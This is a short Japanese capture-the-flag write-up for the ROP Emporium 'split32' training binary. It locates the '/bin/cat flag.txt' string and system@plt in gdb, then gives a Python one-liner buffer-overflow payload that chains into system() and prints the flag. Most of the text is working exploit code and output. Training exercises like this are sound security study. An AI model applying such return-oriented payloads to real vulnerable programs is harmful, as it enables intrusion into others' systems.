stringsしてみると `/bin/cat flag.txt` が見つかる
```
~/ctf/practical-pwn/ROP-Emporium/split32:yyy@(*｡˃̵ω ˂̵｡) < strings split32
/lib/ld-linux.so.2
=&M3
libc.so.6
_IO_stdin_used
puts
stdin
printf
fgets
memset
stdout
stderr
system
setvbuf
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh
QVh{
UWVS
t$,U
[^_]
split by ROP Emporium
32bits
Exiting
Contriving a reason to ask user for data...
/bin/ls
;*2$"(
/bin/cat flag.txt <- Here :)
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
crtstuff.c
```

systemはあるので、

```
0x8048657 <usefulFunction+14>:  call   0x8048430 <system@plt>
```

"/bin/cat flag.txt"をスタックに積んで、systemのアドレスに遷移させる

```
gdb-peda$ find "/bin/cat flag.txt"
Searching for '/bin/cat flag.txt' in: None ranges
Found 1 results, display max 1 items:
split32 : 0x804a030 ("/bin/cat flag.txt")
```

```
python -c 'print "A" * 44 + "\x30\x84\x04\x08" + "AAAA" + "\x30\xa0\x04\x08"' |./split32
                              (system@plt)   (retn_addr)  ("/bin/cat flag.txt")
```

```
split by ROP Emporium
32bits

Contriving a reason to ask user for data...
> ROPE{a_placeholder_32byte_flag!}
zsh: done                              python -c 'print "A" * 44 + "\x30\x84\x04\x08" + "AAAA" + "\x30\xa0\x04\x08"' | 
zsh: segmentation fault (core dumped)  ./split32
```
